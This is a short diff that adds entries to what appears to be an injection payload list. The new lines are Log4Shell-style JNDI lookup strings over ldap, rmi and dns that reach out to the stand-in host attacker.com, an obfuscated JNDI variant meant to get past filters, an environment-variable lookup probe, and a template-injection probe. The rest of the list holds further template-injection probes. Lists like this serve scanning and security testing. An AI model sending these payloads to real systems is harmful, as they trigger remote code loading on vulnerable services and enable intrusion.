@@ -1,4 +1,10 @@
+${${env:ENV_NAME}}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
 ${{7*7}}
+${7*7}
+${jndi:dns://attacker.com/a}
+${jndi:ldap://attacker.com/a}
+${jndi:rmi://attacker.com/a}
 #{7*7}
 <%- 7*7 %>
 <%= 7*7 %>
